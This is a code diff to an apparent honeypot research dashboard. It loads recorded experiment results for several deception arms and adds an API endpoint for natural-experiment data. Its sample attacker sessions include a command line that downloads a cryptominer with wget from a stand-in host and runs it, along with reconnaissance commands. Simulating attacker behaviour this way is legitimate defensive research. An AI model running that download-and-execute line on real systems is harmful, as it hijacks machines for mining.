@@ -165,7 +165,25 @@ class DashboardServer:
 
     def get_arms_data(self) -> Dict[str, Any]:
         """Calculates cost vs intelligence yield per rupee across experimental arms."""
-        # Realistic sample of 100 representative sessions
+        # Prefer empirical results from results/arm_simulation.json if available
+        arm_file = Path(__file__).resolve().parent.parent / "results" / "arm_simulation.json"
+        if arm_file.exists():
+            try:
+                with open(arm_file, "r", encoding="utf-8") as f:
+                    sim_data = json.load(f)
+                arms_payload = dict(sim_data.get("arms", {}))
+                if "Arm D (Adaptive)" in arms_payload and "Arm D (Schrodinger Adaptive)" not in arms_payload:
+                    arms_payload["Arm D (Schrodinger Adaptive)"] = arms_payload["Arm D (Adaptive)"]
+
+                return {
+                    "label": "RECORDED (EVAL 5.1)",
+                    "adaptive_efficiency_multiplier": sim_data.get("adaptive_efficiency_multiplier", 1.0),
+                    **arms_payload,
+                }
+            except Exception as e:
+                logger.warning("Could not read %s: %s", arm_file, e)
+
+        # Realistic sample of 100 representative sessions fallback
         sample_sessions = [
             {"commands": ["uname -a", "cat /proc/cpuinfo", "id"], "files": 0, "pivots": 0, "duration": 25.0},
             {"commands": ["wget http://pool.minr/xmrig", "chmod +x xmrig", "./xmrig"], "files": 1, "pivots": 0, "duration": 180.0},
@@ -196,6 +214,17 @@ class DashboardServer:
             "Arm C (Static T3)": arm_c,
             "Arm D (Schrodinger Adaptive)": arm_d,
         }
+
+    def get_natural_experiment_data(self) -> Dict[str, Any]:
+        """Returns natural experiment association results from results/natural_experiment.json."""
+        nat_file = Path(__file__).resolve().parent.parent / "results" / "natural_experiment.json"
+        if nat_file.exists():
+            try:
+                with open(nat_file, "r", encoding="utf-8") as f:
+                    return json.load(f)
+            except Exception as e:
+                logger.warning("Could not read %s: %s", nat_file, e)
+        return {"status": "NO_NATURAL_EXPERIMENT_DATA"}
 
     def render_index_html(self) -> str:
         """Renders responsive, cyber-protocol single page application with embedded charts."""
@@ -263,6 +292,13 @@ def make_dashboard_handler(server_instance: DashboardServer):
 
             elif path == "/api/arms":
                 data = server_instance.get_arms_data()
+                self.send_response(200)
+                self.send_header("Content-Type", "application/json")
+                self.end_headers()
+                self.wfile.write(json.dumps(data).encode("utf-8"))
+
+            elif path == "/api/natural_experiment":
+                data = server_instance.get_natural_experiment_data()
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
                 self.end_headers()
